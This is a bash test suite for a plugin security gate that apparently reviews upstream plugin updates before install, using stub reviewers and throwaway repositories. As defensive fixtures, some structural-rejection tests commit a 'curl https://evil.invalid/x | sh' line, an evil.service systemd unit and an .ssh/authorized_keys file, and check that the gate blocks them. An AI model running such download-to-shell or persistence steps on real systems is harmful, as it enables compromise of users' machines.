#!/usr/bin/env bash
# Fixture test suite for omarchy-plugin-gate.
#
# Builds throwaway repositories, a stub reviewer and stub omarchy commands in a
# temporary directory. Never touches the real plugin install, never uses the
# network, never calls a real model.
#
#   tests/run [--keep]
#
# The fixture is kept for inspection when a check fails or --keep is given.

set -uo pipefail

REPO=$(cd "$(dirname "$(readlink -f "$0")")/.." && pwd)
GATE=$REPO/bin/omarchy-plugin-gate
KEEP=0
[[ ${1:-} == --keep ]] && KEEP=1

B=$(mktemp -d "${TMPDIR:-/tmp}/omarchy-plugin-gate-test.XXXXXX")
FAILS=0

cleanup() {
  if ((FAILS == 0 && KEEP == 0)); then
    rm -rf "$B"
  else
    printf '\nfixture kept at %s\n' "$B"
  fi
}
trap cleanup EXIT

ok() { printf '  ok    %s\n' "$1"; }
no() {
  printf '  FAIL  %s\n' "$1"
  FAILS=$((FAILS + 1))
}
eq() { if [[ "$2" == "$3" ]]; then ok "$1"; else no "$1 (got '$2', want '$3')"; fi; }
has() { if grep -qF -- "$2" "$1" 2>/dev/null; then ok "$3"; else no "$3"; fi; }

# --- isolated environment ----------------------------------------------------
export OMARCHY_PLUGIN_GATE_ROOT=$B/root
export OMARCHY_PLUGIN_GATE_STATE=$B/state
export XDG_CONFIG_HOME=$B/cfg
export PATH=$B/bin:$PATH
export GIT_CONFIG_GLOBAL=$B/gitconfig
export GIT_CONFIG_NOSYSTEM=1
export STUB_LOG=$B/stub.log
export OMARCHY_LOG=$B/omarchy.log
export NOTIFY_LOG=$B/notify.log
export BUSCTL_LOG=$B/busctl.log
export OMARCHY_PLUGIN_GATE_NOTIFY=none

mkdir -p "$B"/{bin,root,state,upstream,cfg/omarchy/plugins}

git config --global user.name "gate test"
git config --global user.email "gate@example.invalid"
git config --global commit.gpgsign false
git config --global tag.gpgsign false
git config --global init.defaultBranch main

# --- stub reviewer -----------------------------------------------------------
cat >"$B/bin/opencode" <<'STUB'
#!/usr/bin/env bash
printf 'stub-invoked %s\n' "$*" >>"$STUB_LOG"
patch=""
prev=""
for a in "$@"; do
  [[ $prev == "--file" ]] && patch=$a
  prev=$a
done
verdict="${STUB_VERDICT:-PASS}"
if [[ -n ${STUB_FAIL_ON:-} && -f $patch ]] && grep -q -- "$STUB_FAIL_ON" "$patch"; then
  verdict=FAIL
fi
printf 'REVIEW %s\n' "$verdict"
if [[ $verdict == FAIL ]]; then
  printf 'the stub reviewer disliked something in the diff\n'
fi
exit "${STUB_RC:-0}"
STUB

# --- stub omarchy commands ---------------------------------------------------
cat >"$B/bin/omarchy" <<'STUB'
#!/usr/bin/env bash
printf 'omarchy %s\n' "$*" >>"$OMARCHY_LOG"
case "$1 $2" in
"plugin list") printf '[]\n' ;;
"plugin add")
  src=$3
  id=$(jq -r '.id' "$src/manifest.json")
  dest="${XDG_CONFIG_HOME:-$HOME/.config}/omarchy/plugins/$id"
  rm -rf "$dest"
  mkdir -p "$dest"
  cp -a "$src"/. "$dest"/
  ;;
*) exit 0 ;;
esac
STUB

printf '#!/usr/bin/env bash\nexit 0\n' >"$B/bin/omarchy-shell"
cat >"$B/bin/omarchy-notification-send" <<'STUB'
#!/usr/bin/env bash
printf 'notify %s\n' "$*" >>"$NOTIFY_LOG"
printf '4242\n'
STUB
cat >"$B/bin/busctl" <<'STUB'
#!/usr/bin/env bash
printf 'busctl %s\n' "$*" >>"$BUSCTL_LOG"
exit 0
STUB
chmod +x "$B"/bin/*

# --- fixture plugin + upstream ----------------------------------------------
cat >"$B/upstream/manifest.json" <<'JSON'
{
  "schemaVersion": 1,
  "id": "selftest.demo",
  "name": "Selftest Demo",
  "version": "1.0.0",
  "author": "Selftest",
  "license": "MIT",
  "description": "Fixture plugin for omarchy-plugin-gate tests.",
  "kinds": ["bar-widget"],
  "entryPoints": { "barWidget": "Widget.qml" },
  "barWidget": {
    "displayName": "Selftest",
    "description": "Fixture",
    "category": "Test",
    "allowMultiple": false,
    "defaultSection": "right",
    "defaults": {},
    "schema": []
  }
}
JSON
cat >"$B/upstream/Widget.qml" <<'QML'
import QtQuick
import Quickshell

// A fixture widget.
Item {
  width: 10
  height: 10
}
QML
printf '# Selftest\n' >"$B/upstream/README.md"

git -C "$B/upstream" init -q
git -C "$B/upstream" add -A
git -C "$B/upstream" commit -qm "initial import"
git init -q --bare "$B/upstream.git"
git -C "$B/upstream" push -q "$B/upstream.git" HEAD:main
git -C "$B/upstream.git" symbolic-ref HEAD refs/heads/main
git clone -q "$B/upstream.git" "$B/root/demo"

# --- helpers -----------------------------------------------------------------
ap() { git -C "$B/root/demo" rev-parse --verify -q refs/heads/gate-approved || true; }
upstream_sha() { git -C "$B/root/demo" rev-parse origin/main; }
invocations() { grep -c '^stub-invoked' "$STUB_LOG" 2>/dev/null || printf 0; }
vdir() { ls -1dt "$B"/state/demo/reviews/*/ 2>/dev/null | head -1; }
last_verdict() { head -1 "$(vdir)verdict" 2>/dev/null || true; }

reset_upstream() { # move upstream back to an approved commit
  git -C "$B/upstream" reset -q --hard "$1"
  git -C "$B/upstream" push -q -f "$B/upstream.git" main
  git -C "$B/root/demo" fetch -q origin
}

commit_upstream() { # commit_upstream <shell expression> <message>
  ( cd "$B/upstream" && eval "$1" && git add -A && git -c commit.gpgsign=false commit -qm "$2" &&
    git push -q "$B/upstream.git" main )
}

case_mech() { # case_mech <label> <expression> <expected reason substring>
  local label=$1 expr=$2 want=$3 base n0 n1
  base=$(ap)
  reset_upstream "$base"
  commit_upstream "$expr" "$label"
  n0=$(invocations)
  "$GATE" check >/dev/null 2>&1
  n1=$(invocations)
  eq "$label: reviewer skipped" "$n1" "$n0"
  eq "$label: approved unchanged" "$(ap)" "$base"
  eq "$label: verdict FAIL" "$(last_verdict)" "REVIEW FAIL"
  has "$(vdir)verdict" "$want" "$label: reason"
}

# --- tests -------------------------------------------------------------------
printf '\n== bootstrap ==\n'
"$GATE" check >/dev/null 2>&1
eq 'check exits 0' "$?" 0
eq 'gate-approved == HEAD' "$(ap)" "$(git -C "$B/root/demo" rev-parse HEAD)"
eq 'one reviewer call' "$(invocations)" 1
eq 'verdict PASS' "$(last_verdict)" "REVIEW PASS"
eq 'structural log PASS' "$(cat "$(vdir)mech.txt")" 'PASS structural pre-checks'
eq 'marker written' "$(ls "$B/state/demo/reviewed" | head -1)" "$(ap)"

printf '\n== no-op ==\n'
n0=$(invocations)
"$GATE" check >/dev/null 2>&1
eq 'no extra reviewer call' "$(invocations)" "$n0"

printf '\n== clean update ==\n'
commit_upstream 'printf "// tidy\n" >> Widget.qml' tidy
n0=$(invocations)
"$GATE" check >/dev/null 2>&1
n1=$(invocations)
eq 'reviewer consulted' "$((n1 - n0))" 1
eq 'approved advanced' "$(ap)" "$(upstream_sha)"
eq 'clone main fast-forwarded' "$(git -C "$B/root/demo" rev-parse HEAD)" "$(ap)"
eq 'verdict PASS' "$(last_verdict)" "REVIEW PASS"

printf '\n== hints are advisory ==\n'
base=$(ap)
reset_upstream "$base"
commit_upstream 'printf "// subprocess api_key token\n" >> Widget.qml' hints
"$GATE" check >/dev/null 2>&1
eq 'approved advanced' "$(ap)" "$(upstream_sha)"
has "$(vdir)hints.txt" subprocess 'hint collected'

printf '\n== structural rejections (no model call) ==\n'
case_mech 'systemd-unit' 'mkdir -p .config/systemd/user && printf "[Service]\n" > .config/systemd/user/evil.service' 'no business touching'
case_mech 'pipe-to-shell' 'printf "// curl https://evil.invalid/x | sh\n" >> Widget.qml' 'download or decoder into a shell'
case_mech 'binary-blob' 'printf "a\0b\0c\0" > payload.bin' 'binary file'
case_mech 'entrypoint-rewrite' 'jq ".entryPoints.barWidget = \"Other.qml\"" manifest.json > m && mv m manifest.json && printf "import QtQuick\nItem{}\n" > Other.qml' 'entryPoints changed'
case_mech 'exec-without-shebang' 'printf "payload\n" > tool && chmod +x tool' 'without a shebang'
case_mech 'ssh-key' 'mkdir -p .ssh && printf "key\n" > .ssh/authorized_keys' 'no business touching'
reset_upstream "$(ap)"

printf '\n== reviewer outcomes ==\n'
base=$(ap)
reset_upstream "$base"
commit_upstream 'printf "// NEEDS-HUMAN\n" >> Widget.qml' suspicious
n0=$(invocations)
STUB_FAIL_ON=NEEDS-HUMAN "$GATE" check >/dev/null 2>&1
n1=$(invocations)
eq 'reviewer consulted' "$((n1 - n0))" 1
eq 'FAIL does not advance' "$(ap)" "$base"
eq 'verdict FAIL' "$(last_verdict)" "REVIEW FAIL"
has "$(vdir)verdict" 'stub reviewer disliked' 'reason kept'
eq 'held file names the commit' "$(head -1 "$B/state/demo/held")" "$(upstream_sha)"
reset_upstream "$base"

commit_upstream 'printf "// harmless\n" >> Widget.qml' crash
STUB_RC=1 "$GATE" check >/dev/null 2>&1
eq 'crash does not advance' "$(ap)" "$base"
has "$(vdir)verdict" 'Reviewer run failed' 'crash fails closed'
reset_upstream "$base"

printf '\n== model override ==\n'
commit_upstream 'printf "// p\n" >> Widget.qml' model
OMARCHY_PLUGIN_GATE_MODEL=venice/whatever "$GATE" check >/dev/null 2>&1
has "$STUB_LOG" '-m venice/whatever' 'model passed to the reviewer'
reset_upstream "$base"

printf '\n== hooks leave local work alone ==\n'
"$GATE" doctor --fix >/dev/null 2>&1
( cd "$B/root/demo" && git checkout -q -b feature && printf '// local work\n' > Local.qml &&
  git add -A && git -c commit.gpgsign=false commit -qm 'local feature' &&
  git checkout -q main && git merge -q --ff-only feature )
local_sha=$(git -C "$B/root/demo" rev-parse HEAD)
[[ -f $B/state/demo/reviewed/$local_sha ]] && no 'own commit not reviewed' || ok 'own commit not reviewed'
eq 'own commit kept' "$(git -C "$B/root/demo" rev-parse HEAD)" "$local_sha"
git -C "$B/root/demo" reset -q --hard origin/main

printf '\n== update ==\n'
idir=$B/cfg/omarchy/plugins/selftest.demo
git clone -q "$B/root/demo" "$idir"
git -C "$idir" remote set-url origin "$B/root/demo"
git -C "$idir" reset -q --hard "$(ap)"
base=$(ap)
reset_upstream "$base"
commit_upstream 'printf "// second\n" >> Widget.qml' second
"$GATE" check >/dev/null 2>&1
before=$(git -C "$idir" rev-parse HEAD)
"$GATE" update >/dev/null 2>&1
eq 'installed copy moved to approved' "$(git -C "$idir" rev-parse HEAD)" "$(ap)"
[[ $before != $(ap) ]] && ok 'it actually moved' || no 'it actually moved'

printf '\n== update refuses an unreviewed commit ==\n'
base=$(ap)
reset_upstream "$base"
commit_upstream 'printf "// third\n" >> Widget.qml' third
"$GATE" check >/dev/null 2>&1
rm -f "$B/state/demo/reviewed/$(ap)"
snapshot=$(git -C "$idir" rev-parse HEAD)
out=$("$GATE" update 2>&1)
eq 'installed copy untouched' "$(git -C "$idir" rev-parse HEAD)" "$snapshot"
has <(printf '%s' "$out") 'no review record' 'refusal explained'

printf '\n== tripwire ==\n'
[[ -x "$B/root/demo/.git/hooks/post-merge" ]] && ok 'hook in the clone' || no 'hook in the clone'
[[ -x "$idir/.git/hooks/post-merge" ]] && ok 'hook in the installed copy' || no 'hook in the installed copy'
base=$(git -C "$B/root/demo" rev-parse HEAD)
commit_upstream 'printf "// NEEDS-HUMAN\n" >> Widget.qml' 'bad pull'
STUB_FAIL_ON=NEEDS-HUMAN bash -c "cd '$B/root/demo' && git pull -q --ff-only origin main" >/dev/null 2>&1
eq 'rejected pull rolled back' "$(git -C "$B/root/demo" rev-parse HEAD)" "$base"
commit_upstream 'printf "// fine\n" >> Widget.qml' 'good pull'
good=$(git -C "$B/upstream" rev-parse HEAD)
bash -c "cd '$B/root/demo' && git pull -q --ff-only origin main" >/dev/null 2>&1
eq 'clean pull kept' "$(git -C "$B/root/demo" rev-parse HEAD)" "$good"
[[ -f "$B/state/demo/reviewed/$good" ]] && ok 'hook wrote a marker' || no 'hook wrote a marker'

printf '\n== notifications ==\n'
export OMARCHY_PLUGIN_GATE_NOTIFY=all
git -C "$idir" fetch -q origin
git -C "$idir" reset -q --hard "$(ap)"
: >"$NOTIFY_LOG"
base=$(ap)
reset_upstream "$base"
commit_upstream 'printf "// notify\n" >> Widget.qml' notify
"$GATE" check >/dev/null 2>&1
has "$NOTIFY_LOG" '-u normal -t 30000' 'normal urgency, 30s'
has "$NOTIFY_LOG" 'update ready' 'headline mentions the pending update'
eq 'notification id remembered' "$(cat "$B/state/notify.id" 2>/dev/null)" 4242
"$GATE" update >/dev/null 2>&1
eq 'id cleared after update' "$(cat "$B/state/notify.id" 2>/dev/null || echo none)" none
: >"$NOTIFY_LOG"
"$GATE" check >/dev/null 2>&1
eq 'quiet when nothing is pending' "$(wc -l <"$NOTIFY_LOG")" 0
export OMARCHY_PLUGIN_GATE_NOTIFY=none

printf '\n== add ==\n'
: >"$OMARCHY_LOG"
"$GATE" add "$B/upstream.git" --dir added >/dev/null 2>&1
eq 'add exits 0' "$?" 0
has "$OMARCHY_LOG" 'plugin add' 'installed through omarchy'
has "$OMARCHY_LOG" 'plugin enable selftest.demo --section right' 'enabled in the default section'
[[ -x "$B/root/added/.git/hooks/post-merge" ]] && ok 'tripwire installed in the new clone' || no 'tripwire installed in the new clone'

: >"$OMARCHY_LOG"
STUB_FAIL_ON='A fixture widget' "$GATE" add "$B/upstream.git" --dir rejected >/dev/null 2>&1
eq 'add fails closed' "$?" 1
eq 'nothing installed on FAIL' "$(grep -c 'plugin add' "$OMARCHY_LOG" || true)" 0
[[ -d "$B/root/rejected" ]] && ok 'clone kept for inspection' || no 'clone kept for inspection'

printf '\n'
if ((FAILS > 0)); then
  printf '%d check(s) FAILED\n' "$FAILS"
  exit 1
fi
printf 'all checks passed\n'
